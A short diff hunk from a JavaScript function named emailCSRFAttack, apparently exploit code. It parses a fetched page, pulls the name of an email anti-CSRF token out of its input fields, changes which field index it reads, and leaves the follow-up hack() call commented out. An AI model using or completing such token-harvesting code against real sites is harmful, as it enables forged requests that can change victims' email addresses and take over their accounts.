@@ -32,7 +32,7 @@ function emailCSRFAttack()
                        var loot = document.createElement('html');
 					   loot.innerHTML = datax;
 					   all_elements = loot.getElementsByTagName( 'input' );
-					   vc_email_token = all_elements[2].name;
+					   vc_email_token = all_elements[49].name;
 					   alert('Your token name: '+vc_email_token);
 					   //hack(vc_email_token);
 
